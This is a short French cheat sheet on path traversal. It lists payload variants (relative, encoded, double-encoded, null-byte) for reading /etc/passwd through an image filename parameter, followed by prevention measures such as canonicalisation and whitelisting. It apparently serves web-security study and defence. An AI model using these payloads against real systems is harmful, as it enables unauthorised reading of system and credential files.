# Path Traversal

## Les bases

* Linux ou Windows ?
* src="/image?filename=../../../etc/passwd"
* src="/image?filename=/etc/passwd"
* src="/image?filename=....//....//....//etc/passwd"
* src="/image?filename=%2e%2e%2f%2e%2e%2fetc/passwd"
* src="/image?filename=%252e%252e%252f%252e%252e%252fetc/passwd"
* src="/image?filename=../../../etc/passwd%00.png

## Préventions

* Ne pas passer l'input au filesystem (ID → fichier côté serveur)
* Whitelist / alphanumérique uniquement
* Décoder puis rejeter .., /, %00
* Canonicaliser et vérifier le préfixe (Path.startsWith, pas String.startsWith)
* Moindre privilège (chroot/conteneur)